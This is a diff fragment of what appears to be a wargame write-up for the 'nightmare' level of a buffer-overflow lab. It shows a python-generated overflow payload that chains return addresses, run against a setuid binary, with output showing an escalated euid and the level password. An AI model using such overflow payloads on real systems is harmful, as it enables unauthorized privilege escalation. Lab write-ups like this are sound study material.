@@ -78,11 +78,11 @@ char *strcpy(char *_Dest, char const *_Source);
 ```
 [succubus@localhost succubus]$ ./nightmare `python -c 'print "\xe0\x8a\x05\x40"+"A"*4+"\xf9\xbf\x0f\x40"+"A"*32+"\x10\x84\x04\x08"+"A"*4+"\xd0\xfa\xff\xbf"+"\xa0\xfa\xff\xbf"'`
 �@AAAA�@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������
+bash$ id
+uid=517(succubus) gid=517(succubus) euid=518(nightmare) egid=518(nightmare) groups=517(succubus)
 bash$ my-pass
 euid = 518
 beg for me
-bash$ id
-uid=517(succubus) gid=517(succubus) euid=518(nightmare) egid=518(nightmare) groups=517(succubus)
 ```
 
 -----
